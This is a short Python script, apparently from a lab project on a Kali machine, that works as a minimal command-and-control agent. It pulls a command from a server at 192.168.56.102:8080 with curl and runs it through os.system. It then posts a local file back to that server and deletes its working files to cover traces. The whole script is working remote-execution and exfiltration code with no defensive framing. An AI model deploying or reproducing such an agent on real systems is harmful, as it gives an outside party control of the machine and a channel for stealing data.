#!/usr/bin/env python3
import os

def main():
    os.system('curl 192.168.56.102:8080/instructions.txt | cut -d "\'" -f2 > response.txt')
    with open('/home/kali/project/webserver/response.txt') as input_file:
        contents = input_file.read()
        os.system(contents)
        os.system('curl -d @/home/kali/project/webserver/sendthis.txt 192.168.56.102:8080/instructions.txt')
        os.system('rm /home/kali/project/webserver/sendthis.txt /home/kali/project/webserver/response.txt')



if __name__ == "__main__":   
    main()
